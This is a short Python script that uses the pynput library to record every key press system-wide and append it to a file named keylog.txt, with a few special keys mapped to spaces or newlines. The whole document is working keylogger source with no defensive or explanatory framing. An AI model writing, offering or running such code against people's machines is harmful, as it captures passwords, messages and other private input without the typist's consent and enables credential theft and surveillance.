# storing the strokes in a text file
from pynput.keyboard import Listener

def writetofile(key):
    key = str(key)
    key = key.replace("'","")

    if key == 'Key.space':
        key = ' '
    if key == 'Key.shift_r':
        key = ''
    if key == "Key.ctrl_l":
        key = ""
    if key == "Key.enter":
        key = "\n"
    with open('keylog.txt','a') as f:
        f.write(key)



with Listener(on_press=writetofile) as listen:
    listen.join()

